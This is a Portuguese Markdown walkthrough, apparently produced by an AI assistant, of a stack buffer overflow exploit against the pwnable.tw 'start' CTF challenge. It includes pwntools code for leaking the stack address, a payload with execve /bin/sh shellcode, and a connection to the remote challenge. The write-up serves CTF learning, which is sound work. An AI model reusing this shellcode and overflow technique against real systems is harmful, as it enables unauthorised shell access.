Aqui está uma versão simplificada e destacada do seu exploit em Markdown para facilitar a leitura e compreensão no GitHub:

```markdown
# Exploit Walkthrough

Este documento explica o processo de exploração de uma vulnerabilidade em um binário ELF de 32 bits.

## 1. Análise Inicial

Para iniciar a análise, foi utilizado o comando `file` para determinar que o binário era um executável ELF de 32 bits, estático e não depurado.

```bash
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

## 2. Disassembly e Identificação de Funções

Utilizando o `gdb`, foi realizada a desmontagem (_disassembly_) da função `_start` para entender o fluxo do programa.

```gdb
(gdb) disas _start
```

Aqui foi possível identificar as instruções iniciais que configuram os registradores e a pilha.

## 3. Definindo o Ponto de Interrupção

Um ponto de interrupção foi definido em `_start+57`, logo após a execução da interrupção `int $0x80` que realiza uma chamada ao sistema para escrever na saída padrão.

```gdb
(gdb) break *_start+57
(gdb) r
```

## 4. Explorando a Vulnerabilidade

O objetivo é manipular a execução para injetar e executar um shellcode.

### 4.1 Leak do Endereço da Pilha

Primeiro, precisamos vazar o endereço da pilha. Para isso, utilizamos o seguinte código:

```python
def leak(r):
    buf = b"A" * 20
    buf += p32(0x08048087)  # Endereço que aponta para o próximo push
    r.recvuntil(b'CTF:')
    r.send(buf)

    response = r.recv(4)
    esp = u32(response)
    print(f"[+] ESP is at {hex(esp)}")
    
    return esp
```

### 4.2 Envio do Payload

Com o endereço da pilha em mãos, preparamos o payload para injetar o shellcode na memória:

```python
def exploit(r, esp):
    buf = b"A" * 20
    eip = p32(esp + 20)

    # Shellcode para execução de `/bin/sh`
    shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

    payload = buf + eip + shellcode
    
    print("[+] Sending Payload")
    r.send(payload)
    
    r.interactive()
```

## 5. Conexão e Exploração

Finalmente, criamos uma conexão com o serviço remoto e executamos o exploit:

```python
r = remote('chall.pwnable.tw', 10000)
esp = leak(r)
exploit(r, esp)
```
